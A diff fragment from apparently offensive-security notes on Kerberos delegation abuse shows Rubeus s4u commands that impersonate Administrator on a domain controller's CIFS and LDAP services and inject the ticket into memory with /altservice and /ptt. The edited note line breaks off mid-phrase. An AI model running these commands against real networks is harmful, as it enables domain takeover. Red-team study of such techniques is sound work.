@@ -785,7 +785,7 @@ There is also a possiblity of requesting a TGS for more services than is specifi
 Rubeus.exe s4u /ticket:adminsrv$_LOCALxxx.kirbi /impersonateuser:Administrator /domain:ecorp.lab /msdsspn:cifs/dc01.ecorp.lab|ldap/dc01.ecorp.lab
 ```
 
-**NOTE:** You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP
+**NOTE:** You then save both to disk or output-String, and import the one you want to impersonate i.e., LDAP OR inject straight into memory the altservice-
 
 ```
 .\Rubeus.exe s4u /ticket:doIE+jCCBPag... /impersonateuser:administrator /msdsspn:mssqlsvc/cdc01.prod.corp1.com:1433 /altservice:CIFS /ptt
